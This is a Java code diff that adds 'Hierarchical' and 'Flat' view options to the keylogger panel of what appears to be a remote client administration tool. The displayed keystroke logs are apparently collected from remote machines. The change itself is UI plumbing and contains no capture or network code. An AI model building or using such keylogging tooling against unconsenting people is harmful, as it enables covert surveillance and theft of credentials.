@@ -22,15 +22,20 @@ import java.awt.CardLayout;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 
+import javax.swing.ButtonGroup;
 import javax.swing.JMenu;
 import javax.swing.JMenuBar;
 import javax.swing.JPanel;
+import javax.swing.JRadioButton;
 
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.sv.keylogger.LogCallback;
 import com.subterranean_security.crimson.sv.profile.ClientProfile;
+import com.subterranean_security.crimson.viewer.ViewerStore;
 import com.subterranean_security.crimson.viewer.ui.common.components.Console;
 import com.subterranean_security.crimson.viewer.ui.screen.controlpanels.client.CPPanel;
+import java.awt.event.ActionListener;
+import java.awt.event.ActionEvent;
 
 public class Keylogger extends JPanel implements CPPanel {
 
@@ -51,6 +56,8 @@ public class Keylogger extends JPanel implements CPPanel {
 
 	private JPanel content_panel;
 	private JPanel loading;
+	private JRadioButton rdbtnHierarchical;
+	private JRadioButton rdbtnFlat;
 
 	public Keylogger(ClientProfile profile, Console console) {
 
@@ -95,6 +102,43 @@ public class Keylogger extends JPanel implements CPPanel {
 
 		mnView = new JMenu("View");
 		menuBar.add(mnView);
+
+		rdbtnHierarchical = new JRadioButton("Hierarchical");
+		rdbtnHierarchical.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				ViewerStore.Databases.local.storeObject("keylog.treeview", false);
+				logTree.resetTree();
+				logTree.setFormatters();
+				logTree.refreshTree();
+			}
+		});
+		mnView.add(rdbtnHierarchical);
+
+		rdbtnFlat = new JRadioButton("Flat");
+		rdbtnFlat.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				ViewerStore.Databases.local.storeObject("keylog.treeview", true);
+				logTree.resetTree();
+				logTree.setFormatters();
+				logTree.refreshTree();
+			}
+		});
+		mnView.add(rdbtnFlat);
+
+		ButtonGroup bg = new ButtonGroup();
+		bg.add(rdbtnHierarchical);
+		bg.add(rdbtnFlat);
+
+		try {
+			if (ViewerStore.Databases.local.getBoolean("keylog.treeview")) {
+				rdbtnFlat.setSelected(true);
+			} else {
+				rdbtnHierarchical.setSelected(true);
+			}
+
+		} catch (Exception e1) {
+			rdbtnHierarchical.setSelected(true);
+		}
 
 		profile.getKeylog().addCallback(new LogCallback(this));
 
